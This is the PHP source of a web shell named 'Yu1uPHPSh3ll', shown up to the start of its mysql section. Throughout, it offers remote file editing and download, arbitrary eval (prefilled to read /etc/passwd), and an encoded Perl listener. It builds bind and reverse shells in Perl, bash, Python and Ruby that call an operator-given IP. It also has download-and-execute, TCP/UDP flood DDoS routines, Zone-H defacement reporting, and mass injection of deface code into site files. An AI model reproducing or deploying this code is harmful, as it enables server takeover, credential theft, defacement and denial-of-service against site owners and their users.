<?php
session_start();


error_reporting(E_ERROR | E_PARSE);
@ini_set("max_execution_time",0);
@set_time_limit(0); #No Fx in SafeMode
@ignore_user_abort(TRUE);
@set_magic_quotes_runtime(0);

// global configs

$password = "yulu"; // shell password, change it, max 50 chars
$about = "[+]www.yu1u.org QQ:727353598";
		
// symlink script :)		
$symlink = stripslashes(base64_decode("IyEvdXNyL2Jpbi9lbnYgcGVybA0KIyBkZXZpbHpjMGRlLm9yZyAoYykgMjAxMg0KDQp1c2UgU29ja2V0Ow0KDQokcG9ydCA9IDEzMTIzOw0KDQokcHJvdG9jb2w9Z2V0cHJvdG9ieW5hbWUoXCd0Y3BcJyk7DQpzb2NrZXQoUywmUEZfSU5FVCwmU09DS19TVFJFQU0sJHByb3RvY29sKSB8fCBkaWU7DQpzZXRzb2Nrb3B0KFMsU09MX1NPQ0tFVCxTT19SRVVTRUFERFIsMSk7DQpiaW5kIChTLHNvY2thZGRyX2luKCRwb3J0LElOQUREUl9BTlkpKSB8fCBkaWU7DQpsaXN0ZW4gKFMsMykgfHwgZGllOw0Kd2hpbGUoMSl7DQoJYWNjZXB0IChDT05OLFMpOw0KCSRyZXE9PENPTk4+OyBjaG9tcCgkcmVxKTsgJHJlcT1+cy9cXHIvL2c7DQoJJHJlcSA9fiBzL1xcJShbQS1GYS1mMC05XXsyfSkvcGFjayhcJ0NcJywgaGV4KCQxKSkvc2VnOw0KCQ0KCXByaW50ICRyZXEuXCJcXHJcXG5cIjsNCgkNCgkkaGVhZGVycyA9IFwiSFRUUC8xLjEgMjAwIE9LXFxyXFxuXCI7DQoJJGhlYWRlcnMgLj0gXCJTZXJ2ZXI6IFBlcmxcXHJcXG5cIjsNCgkNCgkkdGFyZ2V0ID0gJHJlcTsNCglpZigkcmVxID1+IC9HRVQgLiogSFRUUC4qLyl7DQoJCSR0YXJnZXQgPX4gcy9HRVRcXCAvLzsNCgkJJHRhcmdldCA9fiBzL1xcIEhUVFAuKi8vOw0KCQkkcmVzcCA9IFwiXCI7DQoJCWlmKC1kICR0YXJnZXQpew0KCQkJaWYoISgkdGFyZ2V0ID1+IC8uKlxcLyskLykpew0KCQkJCSR0YXJnZXQgPSAkdGFyZ2V0LlwiL1wiOw0KCQkJfQ0KCQkJDQoJCQkkcmVzcCA9IFwiPCFET0NUWVBFIGh0bWwgUFVCTElDIFxcXCItLy9XM0MvL0RURCBIVE1MIDMuMiBGaW5hbC8vRU5cXFwiPg0KCQkJCQk8aHRtbD4NCgkJCQkJPHRpdGxlPkRpcmVjdG9yeSBsaXN0aW5nIGZvciBcIi4kdGFyZ2V0LlwiPC90aXRsZT4NCgkJCQkJPGJvZHk+DQoJCQkJCTxoMj5EaXJlY3RvcnkgbGlzdGluZyBmb3IgXCIuJHRhcmdldC5cIjwvaDI+DQoJCQkJCTxocj48dWw+XCI7DQoJCQkJCQ0KCQkJaWYob3BlbmRpcihESVIsJHRhcmdldCkpew0KCQkJCXdoaWxlKCRmaWxlID0gcmVhZGRpcihESVIpKXsNCgkJCQkJaWYoLWQgJHRhcmdldC4kZmlsZSl7DQoJCQkJCQlpZigoJGZpbGUgZXEgXCIuXCIpIHx8ICgkZmlsZSBlcSBcIi4uXCIpKXsgbmV4dDsgfQ0KCQkJCQkJJHJlc3AgLj0gXCI8bGk+PGEgaHJlZj1cXFwiXCIuJHRhcmdldC4kZmlsZS5cIi9cXFwiPlwiLiRmaWxlLlwiLzwvYT48L2xpPlxcclxcblwiOw0KCQkJCQl9DQoJCQkJCWVsc2lmKC1mICR0YXJnZXQuJGZpbGUpew0KCQkJCQkJJHJlc3AgLj0gXCI8bGk+PGEgaHJlZj1cXFwiXCIuJHRhcmdldC4kZmlsZS5cIlxcXCI+XCIuJGZpbGUuXCI8L2E+PC9saT5cXHJcXG5cIjsNCgkJCQkJfQ0KCQkJCX0NCgkJCQljbG9zZWRpcihESVIpOw0KCQkJfQ0KDQoJCQkkcmVzcCAuPSBcIjwvdWw+PGhyPg0KCQkJCQk8L2JvZHk+DQoJCQkJCTwvaHRtbD5cIjsNCgkJCQkJDQoJCQkkY29ubGVuID0gbGVuZ3RoKCRyZXNwKTsNCgkJCSRjb250eXBlID0gXCJ0ZXh0L2h0bWxcIjsNCgkJCXByaW50IFwiRGlyIDogXCIuJHRhcmdldC5cIlxcclxcblwiOw0KCQl9DQoJCWVsc2lmKC1mICR0YXJnZXQpew0KCQkJJGNvbmxlbiA9IC1zICR0YXJnZXQ7DQoJCQkkY29udHlwZSA9IFwidGV4dC9wbGFpblwiOw0KCQkJcHJpbnQgXCJGaWxlIDogXCIuJHRhcmdldC5cIiAoXCIuJGNvbmxlbi5cIilcXHJcXG5cIjsNCgkJfQ0KDQoJCXByaW50IFwiY29udHlwZSA6IFwiLiRjb250eXBlLlwiXFxyXFxuXCI7DQoJCXByaW50IFwiY29ubGVuIDogXCIuJGNvbmxlbi5cIlxcclxcblwiOw0KCQkNCgkJJGhlYWRlcnMgLj0gXCJDb250ZW50LVR5cGU6IFwiLiRjb250eXBlLlwiXFxyXFxuXCI7DQoJCSRoZWFkZXJzIC49IFwiQ29udGVudC1MZW5ndGg6IFwiLiRjb25sZW4uXCJcXHJcXG5cIjsNCgkNCgkJcHJpbnQgQ09OTiAkaGVhZGVycy5cIlxcclxcblwiOw0KCQkNCgkJaWYoLWQgJHRhcmdldCl7DQoJCQlwcmludCBDT05OICRyZXNwOw0KCQl9DQoJCWVsc2lmKC1mICR0YXJnZXQpew0KCQkJaWYob3BlbihGSUxFLCR0YXJnZXQpKXsNCgkJCQliaW5tb2RlIEZJTEU7DQoJCQkJd2hpbGUgKCgkbiA9IHJlYWQgRklMRSwgJGRhdGEsIDEwMjQpICE9IDApIHsgDQoJCQkJCXByaW50IENPTk4gJGRhdGE7DQoJCQkJfSANCgkJCQljbG9zZShGSUxFKTsgDQoJCQl9DQoJCX0NCgl9DQoJY2xvc2UgQ09OTjsNCn0NCmV4aXQgMDs="));


function Zip($source, $destination) // Thanks to Alix Axel
{
    if (!extension_loaded('zip') || !file_exists($source)) {
        return false;
    }

    $zip = new ZipArchive();
    if (!$zip->open($destination, ZIPARCHIVE::CREATE)) {
        return false;
    }

    $source = str_replace('\\', '/', realpath($source));

    if (is_dir($source) === true)
    {
        $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($source), RecursiveIteratorIterator::SELF_FIRST);

        foreach ($files as $file)
        {
            $file = str_replace('\\', '/', realpath($file));

            if (is_dir($file) === true)
            {
                $zip->addEmptyDir(str_replace($source . '/', '', $file . '/'));
            }
            else if (is_file($file) === true)
            {
                $zip->addFromString(str_replace($source . '/', '', $file), file_get_contents($file));
            }
        }
    }
    else if (is_file($source) === true)
    {
        $zip->addFromString(basename($source), file_get_contents($source));
    }

    return $zip->close();
}

function getperms ($file) {        
    $perm = substr(sprintf('%o', fileperms($file)), -4);
    return $perm;
}

if(isset($_GET['zip'])) {
    $src = $_GET['zip'];
    $dst = getcwd()."/".basename($_GET['zip']).".zip";
    if (Zip($src, $dst) != false) {
        $filez = file_get_contents($dst);
        header("Content-type: application/octet-stream");
        header("Content-length: ".strlen($filez));
        header("Content-disposition: attachment; filename=\"".basename($dst)."\";");
        echo $filez;
    }
    exit;
}

function showDrives()
    {
        global $self;
        foreach(range('A','Z') as $drive)
        {
            if(is_dir($drive.':\\'))
            {
                ?>
                &nbsp;&nbsp;&nbsp;&nbsp;<a style="font-family:vernada;color:pink" href='<?php echo $self ?>?go=<?php echo $drive.":\\"; ?>&action=files'>
                    <?php echo $drive.":\\" ?>
                </a> 
                <?php
            }
        }
    }


function HumanReadableFilesize($size)
    {
 
        $mod = 1024;
 
        $units = explode(' ','B KB MB GB TB PB');
        for ($i = 0; $size > $mod; $i++) 
        {
            $size /= $mod;
        }
 
        return round($size, 2) . ' ' . $units[$i];
    }
function getFilePermissions($file)
{
    
$perms = fileperms($file);

if (($perms & 0xC000) == 0xC000) {
    // Socket
    $info = 's';
} elseif (($perms & 0xA000) == 0xA000) {
    // Symbolic Link
    $info = 'l';
} elseif (($perms & 0x8000) == 0x8000) {
    // Regular
    $info = '-';
} elseif (($perms & 0x6000) == 0x6000) {
    // Block special
    $info = 'b';
} elseif (($perms & 0x4000) == 0x4000) {
    // Directory
    $info = 'd';
} elseif (($perms & 0x2000) == 0x2000) {
    // Character special
    $info = 'c';
} elseif (($perms & 0x1000) == 0x1000) {
    // FIFO pipe
    $info = 'p';
} else {
    // Unknown
    $info = 'u';
}

// Owner
$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ?
            (($perms & 0x0800) ? 's' : 'x' ) :
            (($perms & 0x0800) ? 'S' : '-'));

// Group
$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ?
            (($perms & 0x0400) ? 's' : 'x' ) :
            (($perms & 0x0400) ? 'S' : '-'));

// World
$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
            (($perms & 0x0200) ? 't' : 'x' ) :
            (($perms & 0x0200) ? 'T' : '-'));

return $info;

}
function dirSize($directory) {
    $size = 0;
    foreach(new RecursiveIteratorIterator(new RecursiveDirectoryIterator($directory)) as $file){
        try {       
            $size += $file->getSize();
        }
        catch (Exception $e){    // Symlinks and other shits
            $size += 0;
        }
    }
    return $size;
}

// ddos ./Syrian_Shell
function DDOSTcp($url)
{
	while(1)
	{
		$ch = curl_init($url);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		$do = curl_exec($ch);
		curl_close($ch); 
		flush();
	}
return true;
}
function DDOSUdp($url)
{
    $packets = 0;
    ignore_user_abort(TRUE);
    set_time_limit(0);
    for($i=0;$i<65000;$i++){$out .= 'X'; }
    while(1)
	{
    		$packets++;
            $rand = rand(1,65000);
            $fp = fsockopen('udp://'.$url, $rand, $errno, $errstr, 5);
            if($fp){fwrite($fp, $out); fclose($fp);}
    } echo "UDP Flood : Completed with $packets (" . round(($packets*65)/1024, 2) . " MB) packets averaging\n";
}
function ZoneH($url, $hacker, $hackmode,$reson, $site )
{
	$k = curl_init();
	curl_setopt($k, CURLOPT_URL, $url);
	curl_setopt($k,CURLOPT_POST,true);
	curl_setopt($k, CURLOPT_POSTFIELDS,"defacer=".$hacker."&domain1=". $site."&hackmode=".$hackmode."&reason=".$reson);
	curl_setopt($k,CURLOPT_FOLLOWLOCATION, true);
	curl_setopt($k, CURLOPT_RETURNTRANSFER, true);
	$kubra = curl_exec($k);
	curl_close($k);return $kubra;
}
// } syrian

?>
<html>
<head>
<title>Yu1uPHPSh3ll - chinese hackers win! </title>
<style type="text/css">
*{
margin:0;
padding:0;
border:0;
}
body{
background-color: black !important;
color: green;
}
input, textarea, select{
outline: none;
}
a{
text-decoration:none;
background:0 !important;
color: #00cc00;
}
#menu{
padding: 5px;
border-bottom: 1px solid green;
}
#menu:hover{
border-bottom: 1px solid red;
}
#menu a{
padding: 3px;
border: 1px solid green;
color: green;
text-decoration: none;color: #00ff00;
font-family: Tahoma, Geneva, sans-serif;
font-size:12px;
background:0 !important;
}
#menu a:hover{
border: 1px solid red;
color: red;
}
#t-head{
width:100%;
background: #00aa00;
}
#t-head:hover{
background: #00cc00;
}
#det{
border-bottom: 1px solid green;
font-family: �Courier New�, Courier, monospace;
font-size: 12px;
}
#det:hover{
border-bottom: 1px solid #00ff00;
}
input[type=submit], input[type=text]{
padding: 3px;
color: #00ff00;
border: 1px solid green;
background: black;
}
input[type=submit]:hover, input[type=text]:hover{
background: green;
border: 1px solid #00ff00;
}
select{
padding: 3px;
width: 162px;
color: #00ff00;
border: 1px solid green;
background: black;
text-decoration: none;
}
select:hover{
background: green;
border: 1px solid #00ff00;
}
#commands{
margin-left: 350px;
margin-right: 350px;
}
option{
background: green;
color: #00ff00;
}
#box{
margin-left: 350px;
margin-right: 350px;
border: 1px solid #00ff00;
border-top:0;
color: #006699;
}
#box span{
margin-left: 10px;
margin-right: 10px;
display:block;
padding: 4px;
}
#box span:hover{
background-color:#444;
padding: 3px;
border: 1px solid #006699;
color: #333;
}
#za{
float:right;
   border-top: 1px solid #96d1f8;
   background: #0d5910;
   background: -webkit-gradient(linear, left top, left bottom, from(#139e23), to(#0d5910));
   background: -webkit-linear-gradient(top, #139e23, #0d5910);
   background: -moz-linear-gradient(top, #139e23, #0d5910);
   background: -ms-linear-gradient(top, #139e23, #0d5910);
   background: -o-linear-gradient(top, #139e23, #0d5910);
   padding: 3.5px 7px;
   -webkit-border-radius: 4px;
   -moz-border-radius: 4px;
   border-radius: 4px;
   -webkit-box-shadow: rgba(0,0,0,1) 0 1px 0;
   -moz-box-shadow: rgba(0,0,0,1) 0 1px 0;
   box-shadow: rgba(0,0,0,1) 0 1px 0;
   text-shadow: rgba(0,0,0,.4) 0 1px 0;
   color: #ffffff;
   font-size: 11px;
   font-family: Georgia, serif;
   text-decoration: none;
   vertical-align: middle;
}
#za:hover {
   border-top-color: #28597a;
   background: #28597a;
   color: #ccc;
   }
#za:active {
   border-top-color: #1b435e;
   background: #1b435e;
   }
#sourcea{
color: #00ff00;
background-color:#002d00;
width: 650px;
height: 450px;
}
#source{
margin-left: 350px;
margin-right: 350px;
color: #00ff00;
background-color:#002d00;
width: 650px;
height: 450px;
}
/* mysql tables */
#table{
font-weight: bold;
color: white;
border: 1px solid red;
background: black;
}
#onmouseover:hover{
background-color:red;
}
/* phpinfo */
tr, td, .h{
    background: black !important;
    color: white !important;
}
.v{
    border: 1px solid white !important;
}
.e{
    border: 1px solid red !important;
}
</style>
</head>
<body>
<?php

// ================================
// if user is logged in


if(isset($_SESSION['loggedin']) && !empty($_SESSION['loggedin'])){
// welcome user
echo "<textarea id=\"t-head\">
������IP: ".gethostbyname($_SERVER["HTTP_HOST"])."    ���IP: ".$_SERVER['REMOTE_ADDR']."    PHP�汾: ".phpversion()."    Apache/IIS: ".$_SERVER['SERVER_SOFTWARE']."    ����ϵͳ: ".php_uname()."</textarea>";
?>
<center>
<div id="menu">
<a href="<?php echo htmlentities($_SERVER['PHP_SELF']); ?>">��Ŀ¼</a>
<a href="?action=files">�ļ�����</a>
<a href="?turnoff=ini">PHP.INI</a>
<a href="?action=upload">�ļ��ϴ�</a>
<a href="?action=encoders">encoders</a>
<a href="?action=bind">��</a>
<a href="?action=exploit">Exploit</a>
<a href="?action=symlink" onclick="alert('The window will load and load\nAccess the tool by going to site.com:13123')">Symlink</a>
<a href="?action=eval">Eval</a>
<a href="?action=mass">Mass</a>
<a href="?action=proc">Proc</a>
<a href="?action=zone-h">Zone-h</a>
<a href="?action=ddos">DDOS</a>
<a href="?action=mysql&main=1">Mysql</a>
<a href="?action=tools">����</a>
<a href="?action=phpinfo">phpinfo</a>
<a href="?action=logout" onclick="alert('�㽫�˳���¼��')">�˳���¼</a>
<a href="?action=kill">������ɱ</a>
</div>
<div id="det">
<?php
if(ini_get('safe_mode') == '1'){
echo '<font color="#00ff00"> ��ȫģʽ:</font><font color="red"> ON</font></font>';
}
else{
echo '<font color="#00ff00"> ��ȫģʽ:</font><font color="green"> OFF</font>';
}
if(ini_get('magic_quotes_gpc') == '1'){
echo '<font color="#00ff00"> Magic_quotes_gpc:</font><font color="red"> ON</font> <a href="?turnoff=magic_quotes_gpc"><font color="#00ff00">Turn off</a>';
}
else{
echo '<font color="#00ff00"> Magic_quotes_gpc:</font><font color="green"> OFF</font>';
}
if(function_exists('mysql_connect')){
echo '<font color="#00ff00"> Mysql:</font><font color="green"> ON</font>';
}
else{
echo '<font color="#00ff00"> Mysql:</font><font color="red"> OFF</font>';
}
if(function_exists('mssql_connect')){
echo '<font color="#00ff00"> Mssql:</font><font color="green"> ON</font>';
}
else{
echo '<font color="#00ff00"> Mssql:</font><font color="yellow"> OFF</font>';
}
if(function_exists('pg_connect')){
echo '<font color="#00ff00"> PostgreSQL:</font><font color="green"> ON</font>';
}
else{
echo '<font color="#00ff00"> PostgreSQL:</font><font color="yellow"> OFF</font>';
}
if(function_exists('ocilogon')){
echo '<font color="#00ff00"> Oracle:</font><font color="green"> ON</font>';
}
else{
echo '<font color="#00ff00"> Oracle:</font><font color="yellow"> OFF</font>';
}
if(function_exists('curl_version')){
echo '<font color="#00ff00"> Curl:</font><font color="green"> ON</font>';
}
else{
echo '<font color="#00ff00"> Curl:</font><font color="red"> OFF</font>';
}
if(function_exists('exec')){
echo '<font color="#00ff00"> Exec:</font><font color="green"> ON</font>';
}
else{
echo '<font color="#00ff00"> Exec:</font><font color="red"> OFF</font>';
}
if(!ini_get('open_basedir') != "on"){
echo '<font color="#00ff00"> Open_basedir:</font><font color="red"> OFF</font>';
}
else{
echo '<font color="#00ff00"> Open_basedir:</font><font color="green"> ON</font>';
}
if(!ini_get('ini_restore') != "on"){
echo '<font color="#00ff00"> Ini_restore:</font><font color="red"> OFF</font>';
}
else{
echo '<font color="#00ff00"> Ini_restore:</font><font color="green"> ON</font>';
}
?>
</div>
<div id="det">
<?php
echo '<font color="#00ff00"> ��ֹ����: </font>';
if(ini_get('disable_functions') == ''){
echo ' <font color="green"> None</font>';
}
else{
echo '<font color="red">';
echo ini_get('disable_functions');
echo '</font>';
}
?>
</div></center>
<?php
if(isset($_POST['source']) && isset($_POST['file'])){
$source = $_POST['source'];
$file = $_POST['file'];
$fp = fopen($file, 'w');
fwrite($fp, $source);
fclose($fp);
echo '<center><font color="green"><b>File saved</b></font></center>';
}
if(isset($_GET['turnoff'])){
if(is_writable(".htaccess")){
$value = $_GET['turnoff'];
if(file_exists(".htaccess")){
// fread example
$handle = fopen(".htaccess", "r");
$contents = '';
while (!feof($handle)) {
$read = fread($handle, 8192);
$contents = $contents.$read;
?>
<center><span style="color: #00ff00;font-family: �Courier New�, Courier, monospace;font-size:12px">Use htaccess to turn php.ini functions on/off<br/>Example: php_value magic_quotes_gpc off</span></center>
<form action="" method="post">
<textarea id="source" name="source">
<?php
if($value == 'magic_quotes_gpc'){
$data = 'php_value magic_quotes_gpc off
'.$contents;
echo $data;
}
else{
echo $contents;
}
	?>
	</textarea>
	<input type="hidden" name="file" value=".htaccess"><br/>
	<center><input type="submit" value="Save File"></center>
	</form>
	<?php
}
fclose($handle);
}
}
if(!file_exists(".htaccess")){
// make htaccess file
$myfile = '.htaccess';
$handle = fopen($myfile, 'w') or die('Cannot open file:  '.$myfile);
fclose($handle);
echo '<center><font color="green"><b>File created</b></font> <a href="?turnoff=ini">click here</a></center>';
}
?>
<?php
}
// make file
if(isset($_GET['make'])){
// file maker
if(!file_exists($_GET['make'])){
// make htaccess file
$myfile = $_GET['make'];
$handle = fopen($myfile, 'w') or die('Cannot open file:  '.$myfile);
fclose($handle);
echo '<center><font color="green"><b>File created</b></font> <a href="?view='.$myfile.'&dir=0">click here</a></center>';
}
else{
echo '<center><font color="red">This file exist.</font>&nbsp;&nbsp;&nbsp;&nbsp; <a href="?delete='.$_GET['make'].'">delete</a>&nbsp;&nbsp;&nbsp;&nbsp; <a href="?view='.$_GET['make'].'">open</a><center>';
}
}

if(isset($_GET['get'])){
// download
$file = $_GET['get'];
if (file_exists($file)) {
    header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename='.basename($file));
    header('Content-Transfer-Encoding: binary');
    header('Expires: 0');
    header('Cache-Control: must-revalidate');
    header('Pragma: public');
    header('Content-Length: ' . filesize($file));
    ob_clean();
    flush();
    readfile($file);
	exit();
}
}

if(isset($_GET['view'])){
$file = $_GET['view'];
?>
<form action="" method="post">
<textarea id="source" name="source">
<?php
if(file_exists($file)){
$open = htmlspecialchars(file_get_contents($file));
if($open){
echo $open;
}
}
else{
echo '				FILE DOES NOT EXISTS';
}
?>
</textarea>
<input type="hidden" name="file" value="<?php echo $file; ?>"><br/>
<center><input type="submit" value="Save File"> <a href="?zip=<?php echo $file; ?>" style="font-size:14;padding: 3px;border: 1px solid green;background: black;color: #00ff00;">Download</a> <a href="?delete=<?php echo $file; ?>&action=files" style="font-size:14;padding: 3px;border: 1px solid green;background: black;color: #00ff00;">Delete</a></center>
</form>
<?php
}

if(isset($_GET['action']) && $_GET['action'] == 'symlink'){
$a = fopen("lolz.pl", "w");
fputs($a, $symlink);
fclose($a);
system("perl lolz.pl");
}

if(isset($_GET['action']) && $_GET['action'] == 'ddos' && empty($_POST['ip'])){
?>
<center>
<span style="font-family: Tahoma, Geneva, sans-serif;font-size: 12px; color: #333;">~<br />Ddos<br />~<br /></span>
<form action="" method="post">
<input type="text" value="http://site.com/" name="ip">
<input type="hidden" name="action" value="ddos">
<input type="submit">
<select style="width:60px" name="way">
<option>TCP</option>
<option>UDP</option>
</select>
</form>
</center>
<?php
}
if(isset($_GET['action']) && $_GET['action'] == 'ddos' && !empty($_POST['ip'])){
$url = $_POST['ip'];
if($_POST['way'] == "TCP"){
DDOSTcp($url);
}
else if($_POST['way'] == "UDP"){
DDOSUdp($url);
}
else{
echo 'No other methods.';
}
}

if(isset($_GET['action']) && $_GET['action'] == 'eval'){
?>
<center>
<form action="" method="get">
<span style="font-family: Tahoma, Geneva, sans-serif;font-size: 12px; color: #333;">~<br />Eval<br />~<br /></span>
<input type="hidden" name="action" value="eval">
<input type="text" name="evalit" value="file_get_contents('/etc/passwd');"><input type="submit" value="ִ��">
</form>
<?php
if(isset($_GET['evalit'])){
if(function_exists("system")){
$ev = $_GET['evalit'];
echo eval(stripslashes($ev));
}
else{
echo 'eval disabled';
}
}
echo '<center>';
}

if(isset($_GET['action']) && $_GET['action'] == 'exploit'){
?>
<center>
<span style="font-family: Tahoma, Geneva, sans-serif;font-size: 12px; color: #333;">~<br />Get and execute<br />~<br /></span>
<form action="" method="get">
<input type="text" name="exp_url" value="http://site.com/exploit"> Type:
<select name="run">
<option>c++ | .cpp</option>
<option>python | .py</option>
<option>perl | .pl</option>
<option>ruby | .rb</option>
</select>
<input type="hidden" name="action" value="exploit">
<input type="submit" value="ִ��">
</form>
</center>
<?php
}

if(isset($_GET['exp_url'])){
echo '<center>';
if(function_exists("wget")){
wget($_GET['exp_url']);
echo $_GET['exp_url'].' got in here';
if(function_exists("system")){

if(isset($_GET['run'])){
$run = $_GET['run'];
if($run = 'c++ | .cpp'){
system("gcc -o exploit ".$_GET['exp_url'].";chmod +x exploit;./exploit;");
}
if($run = 'perl | .pl'){
}
if($run = 'python | .py'){
}
if($run = 'ruby | .rb'){
}


}


}
else{
echo 'System command disabled';
}
}
else{
echo('wget disabled');
}
echo '</center>';
}

if(isset($_GET['action']) && $_GET['action'] == 'bind'){
if(!isset($_POST['port']) && empty($_POST['ip']) && empty($_POST['pyip']) && empty($_POST['rbip'])){
echo "<center>#1 ./perl<br/>";
echo '<form action="?action=bind" method="post">
<input type="text" value="port" name="port"><br/>
<input type="submit" value="ִ��">
</form><br/><br/>#2 ./bash<form action="" method="post">
<input type="text" name="ip" value="ip"> <input type="text" name="theport" value="port" style="width:40px"><br/>
<input type="submit" value="ִ��"></form>
<br/><br/>#3 ./python<form action="" method="post">
<input type="text" name="pyip" value="ip"> <input type="text" name="pyport" value="port" style="width:40px"><br/>
<input type="submit" value="ִ��"></form>
<br/><br/>#4 ./ruby linux<form action="" method="post">
<input type="text" name="rbip" value="ip"> <input type="text" name="rbport" value="port" style="width:40px"><br/>
<input type="submit" value="ִ��"></form>
<br/><br/>#5 ./ruby win<form action="" method="post">
<input type="text" name="rbipw" value="ip"> <input type="text" name="rbportw" value="port" style="width:40px"><br/>
<input type="submit" value="ִ��"></form>
';
}
else{
if(isset($_POST['port'])){
$bind = "
#!/usr/bin/perl

\$port = {$_POST['port']};
\$port = \$ARGV[0] if \$ARGV[0];
exit if fork;
$0 = \"updatedb\" . \" \" x100;
\$SIG{CHLD} = 'IGNORE';
use Socket;
socket(S, PF_INET, SOCK_STREAM, 0);
setsockopt(S, SOL_SOCKET, SO_REUSEADDR, 1);
bind(S, sockaddr_in(\$port, INADDR_ANY));
listen(S, 50);
while(1)
{
    accept(X, S);
    unless(fork)
    {
        open STDIN, \"<&X\";
        open STDOUT, \">&X\";
        open STDERR, \">&X\";
        close X;
        exec(\"/bin/sh\");
    }
    close X;
}
";
$fp = fopen("bind.pl", "w");
fwrite($fp, $bind);
fclose($fp);
exec("perl bind.pl");
}


if(isset($_POST['rbip'])){
    $ip = $_POST['rbip'];
    $port = $_POST['rbport'];
$ruby = "ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"".$ip."\",\"".$port."\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'";
$fp = fopen("bind.rb", "w");
fwrite($fp, $ruby);
fclose($fp);
exec("ruby bind.rb");
}

if(isset($_POST['rbipw'])){
    $ip = $_POST['rbipw'];
    $port = $_POST['rbportw'];
$ruby = "ruby -rsocket -e 'c=TCPSocket.new(\"".$ip."\",\"".$port."\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'";
$fp = fopen("bind_win.rb", "w");
fwrite($fp, $ruby);
fclose($fp);
exec("ruby bind_win.rb");
}

if(isset($_POST['pyip'])){
    $ip = $_POST['pyip'];
    $port = $_POST['pyport'];
$bind = "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"".$ip."\",".$port."));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'";

$fp = fopen("bind.py", "w");
fwrite($fp, $bind);
fclose($fp);
exec("python bind.py");
}

if(isset($_POST['ip']) && !empty($_POST['theport'])) {
$ip = $_POST['ip'];
$port = $_POST['theport'];

if(function_exists('exec')){
echo 'Exec command not blocked,,,, continuing';
exec('0<&196;exec 196<>/dev/tcp/.$ip./.$port.; sh <&196 >&196 2>&196');
}
else{
echo 'Exec command is blocked blocked by admin';
}

}
}
echo '</center>';
}

if(isset($_GET['action']) && $_GET['action'] == 'proc'){
?>
<textarea style="width:100%;height:100%;border:0;outline:none;margin:0;padding:0;color: #00ff00;font-family: Tahoma, Geneva, sans-serif;font-size:12px;background:black;margin-left:30px;">
<?php
echo shell_exec("tasklist")."<br/>";
?>
</textarea>
<?php
}

if(isset($_GET['action']) && $_GET['action'] == 'mass'){
    if(!isset($_GET['code'])){

?>

<?php
echo '<form action="" method="get">
<center>Mass deface script, php/html/htm/asp/aspx/js</center><input type="hidden" name="action" value="mass">
<textarea name="code" id="source">YOUR DEFACE PAGE HERE =)</textarea><br/>
<center><font color="#00ff00">Folder:</font> <input type="text" value="'.getcwd().'" name="dir" style="border-top:none;"><br/><input type="submit" value="ִ��" style="border-top:none;"></center>
</form>';
}
else{

	if (is_dir($_GET['dir'])) {
		$lolinject = $_GET['code'];
		foreach (glob($_GET['dir']."/*.php") as $injectj00) {
			$fp=fopen($injectj00,"a+");
			if (fputs($fp,$lolinject)){
				echo $injectj00.' was injected<br/>';
			} else {
				echo '<font color=red>failed to inject '.$injectj00.'</font>';
			}
		}
		foreach (glob($_GET['dir']."/*.html") as $injectj00) {
			$fp=fopen($injectj00,"a+");
			if (fputs($fp,$lolinject)){
				echo $injectj00.' was injected<br/>';
			} else {
				echo '<font color=red>failed to inject '.$injectj00.'</font>';
			}
		}
		foreach (glob($_GET['dir']."/*.htm") as $injectj00) {
			$fp=fopen($injectj00,"a+");
			if (fputs($fp,$lolinject)){
				echo $injectj00.' was injected<br/>';
			} else {
				echo '<font color=red>failed to inject '.$injectj00.'</font>';
			}
		}
		foreach (glob($_GET['dir']."/*.asp") as $injectj00) {
			$fp=fopen($injectj00,"a+");
			if (fputs($fp,$lolinject)){
				echo $injectj00.' was injected<br/>';
			} else {
				echo '<font color=red>failed to inject '.$injectj00.'</font>';
			}
		}
		foreach (glob($_GET['dir']."/*.js") as $injectj00) {
			$fp=fopen($injectj00,"a+");
			if (fputs($fp,$lolinject)){
				echo $injectj00.' was injected<br/>';
			} else {
				echo '<font color=red>failed to inject '.$injectj00.'</font>';
			}
		}
		foreach (glob($_GET['dir']."/*.aspx") as $injectj00) {
			$fp=fopen($injectj00,"a+");
			if (fputs($fp,$lolinject)){
				echo $injectj00.' was injected<br/>';
			} else {
				echo '<font color=red>failed to inject '.$injectj00.'</font>';
			}
		}
	} else { //end if inputted dir is real -- if not, show an ugly red error
		echo '<b><font color=red>'.$_GET['pathtomass'].' is not available!</font></b>';
	} // end if inputted dir is real, for real this time
}

}

if(isset($_GET['action']) && $_GET['action'] == 'encoders'){
?>
<div id="commands"><center>
<h2>Enc0d3 ~ D3c0d3</h2>
<form action="" method="post">
<textarea style="color: #00ff00;background-color:#002d00;" name="code">code here</textarea><br/>
<select name="encoded">
<option>Base64_encode</option>
<option>Base64_decode</option>
<option>Urlencode</option>
<option>Urldecode</option>
<option>Hash_md5</option>
<option>Hash_sha1</option>
<option>Hash_sha512</option>
</select><br/>
<input type="submit" value="ִ��">
</form>
</center></div>
<hr>
<textarea id="source">
<?php
if(isset($_GET['action']) && $_GET['action'] == 'encoders' && !empty($_POST['code']) && !empty($_POST['encoded'])){
$format = $_POST['encoded'];
$code = $_POST['code'];

if($format == 'Base64_encode'){
echo base64_encode($code);
}
if($format == 'Base64_decode'){
echo base64_decode($code);
}
if($format == 'Urlencode'){
echo urlencode($code);
}
if($format == 'Urldecode'){
echo urldecode($code);
}
if($format == 'Hash_md5'){
echo md5($code);
}
if($format == 'Hash_sha1'){
echo sha1($code);
}
if($format == 'Hash_sha512'){
echo hash('sha512', $code);
}

}
?>
</textarea>

<?php
}

if(isset($_GET['action']) && $_GET['action'] == 'mysql' && !empty($_GET['main']) && $_GET['main'] == 1){

?>
